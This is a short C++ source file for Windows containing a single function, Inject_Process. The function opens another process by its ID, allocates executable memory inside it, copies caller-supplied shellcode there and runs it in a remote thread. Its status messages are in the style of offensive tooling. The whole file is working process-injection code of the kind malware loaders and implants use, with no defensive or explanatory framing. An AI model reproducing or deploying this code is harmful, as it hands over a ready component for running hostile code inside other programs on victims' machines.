
#include <Windows.h>
#include <iostream>
#include <string>
#include "Utils.h"

int Inject_Process(int PID, unsigned char shellcode[], size_t shellcode_size)
{
    HANDLE processHandle;
    HANDLE remoteThread;
    LPVOID exec_mem;

    processHandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, PID);

    print("[*] Injecting into PID: " << PID);

    if (processHandle == NULL) {
        print("[-] Failed to open process")
        return 0;
    }

    exec_mem = VirtualAllocEx(processHandle, NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);

    if (exec_mem == NULL) {
        print("[-] Failed to allocate memory in remote process")
		return 0;
	}

    WriteProcessMemory(processHandle, exec_mem, shellcode, shellcode_size, NULL);

    print("[*] Starting remote thread...")

    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);

    if (remoteThread == NULL) {
        print("[-] Failed to create remote thread")
        return 0;
    }
    
    WaitForSingleObject(remoteThread, INFINITE);
    CloseHandle(processHandle);
    CloseHandle(remoteThread);
    return 1;
}
